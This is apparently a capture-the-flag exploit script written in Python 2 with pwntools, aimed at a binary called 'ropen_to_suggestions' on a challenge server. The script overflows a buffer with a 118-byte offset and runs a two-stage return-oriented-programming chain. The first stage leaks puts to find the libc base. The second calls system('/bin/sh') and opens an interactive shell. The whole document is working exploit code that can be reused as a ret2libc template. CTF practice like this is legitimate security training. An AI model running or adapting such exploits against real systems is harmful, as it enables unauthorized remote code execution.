#!/usr/bin/env python2

from pwn import *

r = ''
libc = ''
argError = "Specify local or remote plz..."

### CHANGE THESE ###
localProcess = './ropen_to_suggestions'
remoteHost = 'challenge.acictf.com'
remotePort = 31803
context(arch='amd64')
####################

if len(sys.argv) != 2:
    print argError
    sys.exit(0)

if sys.argv[1] == "local":
    r = process(localProcess)
elif sys.argv[1] == "remote":
    r = remote(remoteHost, remotePort)
else:
    print argError
    sys.exit(0)

"""
gdb.attach(r, '''
b *0x400be6
''')
"""

elf = ELF('./ropen_to_suggestions')
libc = ELF("./libc.so")

### Stage 1 - get puts(); call main ###
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
print rop.dump()
#######################################

### First pass through function #######
[r.recvline() for i in range(3)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
[r.recvline() for i in range(14)]
r.sendline("3")
[r.recvline() for i in range(10)]
r.sendline("4")
print [r.recvline() for i in range(15)]

payload = "D3"
payload += "A" * 118 #eip offset
payload += str(rop)
r.sendline(payload)
print [r.recvline() for i in range(3)]
print "Puts addr: " + r.recvline()
#######################################

### Second pass through function ######
leaked_puts = r.recvline()[:8].strip().ljust(8, '\x00')
leaked_puts = struct.unpack('Q', leaked_puts)[0]
libc.address = leaked_puts - libc.symbols['puts']

rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
print rop2.dump()

[r.recvline() for i in range(4)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline()
[r.recvline() for i in range(3)]
r.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
[r.recvline() for i in range(14)]
r.sendline("3")
[r.recvline() for i in range(10)]
r.sendline("4")
[r.recvline() for i in range(15)]

payload = "D3"
payload += "A" * 118 #eip offset
payload += str(rop2)
r.sendline(payload)
r.interactive()
